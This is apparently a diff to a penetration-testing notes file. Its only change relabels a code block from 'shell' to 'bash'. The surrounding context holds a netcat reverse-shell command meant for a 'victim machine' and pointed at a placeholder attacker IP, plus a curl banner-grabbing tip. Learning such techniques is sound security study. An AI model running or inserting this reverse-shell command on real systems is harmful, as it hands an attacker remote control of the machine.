@@ -31,7 +31,7 @@ We can also use `curl -IL [url]` for banner grabbing web server headers.
 
 ### Create a simple reverse shell
 In many versions of netcat, the *-e* flag doesn't exist so this method isn't all reliable
-```shell
+```bash
 # On victim machine
 nc -e /bin/sh [Atkbox IP] [Port]
 ```
